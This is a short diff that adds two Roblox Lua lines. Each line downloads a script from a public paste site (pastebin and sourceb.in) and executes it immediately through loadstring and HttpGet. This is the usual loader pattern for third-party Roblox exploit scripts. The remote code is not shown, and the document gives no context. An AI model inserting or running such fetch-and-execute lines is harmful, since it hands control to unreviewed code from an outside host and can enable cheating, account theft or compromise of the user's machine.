@@ -1,0 +1,2 @@
+loadstring(game:HttpGet("https://pastebin.com/raw/UcfE5GPz"))()
+loadstring(game:HttpGet("https://cdn.sourceb.in/bins/8pG70PXTiC/0", true))()
